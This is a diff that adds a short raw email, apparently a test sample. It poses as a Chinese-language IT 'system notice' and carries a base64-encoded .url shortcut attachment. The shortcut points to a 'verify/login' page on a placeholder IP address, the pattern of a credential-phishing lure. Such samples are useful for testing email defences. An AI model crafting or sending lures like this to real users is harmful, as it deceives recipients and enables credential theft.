@@ -1,0 +1,19 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev30@partner.example>
+Subject: 系统通知
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+您好，请打开附件访问详情页面。--BS
+Content-Type: application/internet-shortcut
+Content-Disposition: attachment; filename="details.url"
+Content-Transfer-Encoding: base64
+
+W0ludGVybmV0U2hvcnRjdXRdDQpVUkw9aHR0cDovLzIwMy4wLjExMy42MC92ZXJpZnkvbG9naW4NCg==
+--BS--
+
